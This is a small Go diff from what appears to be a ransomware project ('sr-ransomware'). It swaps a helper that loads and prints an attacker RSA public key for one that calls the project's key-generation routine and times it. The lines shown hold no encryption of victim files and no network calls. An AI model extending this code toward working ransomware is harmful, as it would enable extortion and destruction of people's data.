@@ -2,19 +2,16 @@ package main
 
 import (
     "fmt"
-    "io/ioutil"
+    "time"
 
-    cryptoutil "github.com/sug0/sr-ransomware/go/crypto/util"
+    "github.com/sug0/sr-ransomware/go/crypto/scheme"
 )
 
 func main() {
-    data, err := ioutil.ReadFile("../res/attacker/key.pub")
+    t := time.Now()
+    err := scheme.GenerateKeys()
     if err != nil {
         panic(err)
     }
-    key, err := cryptoutil.ImportPEMPublicKeyRSA(data)
-    if err != nil {
-        panic(err)
-    }
-    fmt.Printf("%#v\n", key)
+    fmt.Printf("Keys generated in %s.\n", time.Since(t))
 }
